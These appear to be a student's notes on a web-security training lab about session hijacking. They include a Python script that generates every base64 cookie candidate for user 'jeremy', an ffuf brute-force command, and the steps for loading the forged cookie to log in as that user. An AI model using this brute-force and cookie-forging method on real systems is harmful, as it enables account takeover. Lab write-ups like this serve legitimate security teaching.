

log in as admin

Admin:ramirez

for this lab example we know that Admin logs in and then jeremy automatically will log in at the same time.

This is because in the previous lab we know its admin-time of login - three random character

is the cookie

so now the instructor says we know that when admin logs in, so does jeremy, 

the instructor logs in as admin and knows a cookie has been generated and now we just have to brute force the three random characters because we know the first part of the cookie payload is jeremy, then the time of login which we can find out just by base 64 decoding our own cookie and getting that time stamp, all that is left is just to brute force the three characters

so we use the following script to accomplish it 

```python
import base64

chars = 'abcdefghijklmnopqrstuvwxyz'
prefix = 'jeremy-15:29:08-'
perms = []

for i in range(len(chars)):
    for j in range(len(chars)):
        for k in range(len(chars)):
            perms.append(prefix + chars[i] + chars[j] + chars[k])

for perm in perms:
    print(base64.b64encode(perm.encode()).decode())
```

this will generate the needed tokens to be able to see which one gets us a successful login

We then use the ffuf command after we save the list of tokens

ffuf -request req.txt -request-proto http -w tokens.txt -fs 834

we grab the one with status 200 and size 1741 and we decode it

echo -n 'amVyZW15LTE10jI50jA4LWZxZA== ' | base64 -d

and we get jeremy-15:29:08-fqd

the instructor then just add the cookie to the browser we refresh the page and we get a login with the users cookie.

